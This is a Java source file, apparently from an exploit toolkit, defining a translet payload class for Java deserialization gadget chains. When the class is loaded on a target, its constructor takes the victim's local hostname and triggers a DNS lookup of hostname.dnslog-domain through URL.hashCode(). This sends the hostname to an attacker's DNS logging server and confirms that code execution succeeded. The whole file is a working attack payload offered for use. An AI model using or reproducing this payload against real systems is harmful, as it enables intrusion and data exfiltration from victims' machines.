package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;

public class DnslogLoader extends AbstractTranslet implements Serializable {

    private static String dnslog;

    public DnslogLoader(){
        if(dnslog != null){
            try {
                String baseurl = String.format("http://%s.%s", getHostname(), dnslog);
                URL url = new URL(baseurl);
                url.hashCode();
//                url.openStream();
            } catch (Exception e) {
                // do nothing
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public String getHostname(){
        InetAddress ia = null;
        try {
            ia = InetAddress.getLocalHost();
            return ia.getHostName();
        } catch (UnknownHostException e) {
            return "unknown";
        }
    }
}
